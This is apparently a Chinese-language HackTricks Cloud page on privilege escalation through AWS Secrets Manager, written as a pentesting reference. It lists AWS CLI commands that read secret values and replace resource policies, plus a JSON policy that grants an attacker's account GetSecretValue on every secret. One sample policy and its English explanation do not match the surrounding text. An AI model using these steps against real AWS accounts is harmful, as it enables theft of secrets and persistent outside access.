# AWS - Secrets Manager权限提升

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## Secrets Manager

有关Secrets Manager的更多信息，请查看：

{% content-ref url="../aws-services/aws-secrets-manager-enum.md" %}
[aws-secrets-manager-enum.md](../aws-services/aws-secrets-manager-enum.md)
{% endcontent-ref %}

### `secretsmanager:GetSecretValue`

具有此权限的攻击者可以获取AWS Secrets Manager中**秘密中保存的值**。
```bash
aws secretsmanager get-secret-value --secret-id <secret_name> # Get value
```
**潜在影响：**访问AWS Secrets Manager服务中的高度敏感数据。

### `secretsmanager:GetResourcePolicy`，`secretsmanager:PutResourcePolicy`，(`secretsmanager:ListSecrets`)

通过上述权限，可以将访问**密钥**的权限授予其他主体/账户（甚至是外部主体/账户）。请注意，为了**读取使用KMS密钥加密**的密钥，用户还需要对KMS密钥**具有访问权限**（更多信息请参见[KMS枚举页面](../aws-services/aws-kms-enum.md)）。
```bash
aws secretsmanager list-secrets
aws secretsmanager get-resource-policy --secret-id <secret_name>
aws secretsmanager put-resource-policy --secret-id <secret_name> --resource-policy file:///tmp/policy.json
```
policy.json:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowListSecrets",
            "Effect": "Allow",
            "Action": [
                "secretsmanager:ListSecrets",
                "secretsmanager:ListSecretVersionIds"
            ],
            "Resource": "*"
        },
        {
            "Sid": "AllowGetSecretValue",
            "Effect": "Allow",
            "Action": "secretsmanager:GetSecretValue",
            "Resource": "arn:aws:secretsmanager:us-west-2:123456789012:secret:my-secret"
        }
    ]
}
```

This policy allows the user to list secrets and secret version IDs using the `secretsmanager:ListSecrets` and `secretsmanager:ListSecretVersionIds` actions. It also allows the user to get the value of a specific secret using the `secretsmanager:GetSecretValue` action. The resource specified in the policy is the ARN (Amazon Resource Name) of the secret named "my-secret" in the US West (Oregon) region for the AWS account with the ID "123456789012".
```json
{
"Version" : "2012-10-17",
"Statement" : [ {
"Effect" : "Allow",
"Principal" : {
"AWS" : "arn:aws:iam::<attackers_account>:root"
},
"Action" : "secretsmanager:GetSecretValue",
"Resource" : "*"
} ]
}
```
<details>

<summary><strong>支持HackTricks并获得好处！</strong></summary>

* 如果您想看到您的**公司在HackTricks中被广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者 **关注**我在**Twitter**上的账号 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧**。

</details>
